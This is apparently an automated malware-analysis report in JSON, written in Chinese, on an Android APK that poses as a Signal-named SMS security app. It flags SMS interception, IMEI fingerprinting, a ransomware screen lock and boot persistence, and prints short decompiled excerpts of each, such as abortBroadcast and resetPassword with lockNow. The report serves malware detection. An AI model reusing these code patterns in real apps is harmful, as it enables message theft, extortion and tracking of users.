@@ -1,0 +1,179 @@
+{
+  "APK信息": {
+    "文件名": "0193a4f1afa3afdb5e95b1cbe3431a1abba461dc0ccbf15f46bfd45bc404495d.apk",
+    "sha256": "0193a4f1afa3afdb5e95b1cbe3431a1abba461dc0ccbf15f46bfd45bc404495d",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "ONBA SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 304.6
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\by;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         abortBroadcast();\n>>>     }\n  }",
+          "behavior_description": "该BroadcastReceiver的onReceive方法中直接调用abortBroadcast()，在接收到短信广播(Intent)后立即中止广播的继续传递，阻止其他应用（包括系统默认短信应用）收到该短信，从而实现短信拦截。这是典型的短信拦截木马行为，可导致用户无法收到验证码、银行通知等关键短信，造成信息泄露和财产损失。数据流向：短信广播Intent(source)→abortBroadcast()(sink)中止广播传递",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\i;",
+          "method_signature": "if(telephonyManager.getSimState()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String deviceId = telephonyManager.getDeviceId();\nb(\"IMEI\", deviceId, context);\nreturn deviceId;",
+          "malicious_code_snippet_context": "          if (telephonyManager.getSimState() != 5) {\n              return a(\"IMEI\", \"\", context) != \"\" ? a(\"IMEI\", \"\", context) : \"\";\n          }\n>>>         String deviceId = telephonyManager.getDeviceId();\n>>>         b(\"IMEI\", deviceId, context);\n>>>         return deviceId;\n      }\n  \n      public static String a(String str, String str2, Context context) {",
+          "behavior_description": "代码通过 TelephonyManager.getDeviceId() 获取设备 IMEI 标识符，并将其持久化存储到 SharedPreferences（\"MainPref\"）中。当 SIM 卡未就绪时，从本地缓存读取之前存储的 IMEI；当 SIM 卡就绪时，直接调用系统 API 获取 IMEI 并缓存。数据流向为：telephonyManager.getDeviceId()（source）→ SharedPreferences 持久化存储（sink），属于设备指纹采集行为，IMEI 是敏感设备唯一标识符，可用于追踪用户。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\f;",
+          "method_signature": "if(this.c != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\"); devicePolicyManager.resetPassword(this.c, 1); devicePolicyManager.lockNow();",
+          "malicious_code_snippet_context": "                  return;\n              case LOCK:\n                  if (this.c != \"0\") {\n>>>                     DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n                      devicePolicyManager.resetPassword(this.c, 1);\n                      devicePolicyManager.lockNow();\n                      i.b(\"Device locked\", context);",
+          "behavior_description": "代码通过DevicePolicyManager调用resetPassword()重置设备锁屏密码为指定值(this.c)，随后调用lockNow()立即锁定设备，使用户无法正常进入系统。这是典型的Android勒索软件锁屏行为，攻击者通过远程指令或预设密码锁定设备，以此勒索用户支付赎金才能解锁。数据来源为变量this.c(密码字符串，可能来自C2远程指令或硬编码配置)→危险操作为devicePolicyManager.resetPassword()和devicePolicyManager.lockNow()。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "if(i.h(context)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public class OnBootReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        if (i.h(context).booleanValue()) {\n            return;\n        }\n        context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n    }\n}",
+          "malicious_code_snippet_context": "  import org.thoughtcrime.securesms.h.i;\n  \n  /* loaded from: classes.dex */\n>>> public class OnBootReceiver extends BroadcastReceiver {\n>>>     @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (i.h(context).booleanValue()) {\n>>>             return;\n>>>         }\n>>>         i.c(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n>>>     }\n  }",
+          "behavior_description": "应用注册了开机广播接收器，监听到设备重启完成后，自动启动名为 XMainProcessStart 的后台服务，实现开机自启和恶意服务保活，确保恶意行为在设备重启后持续运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
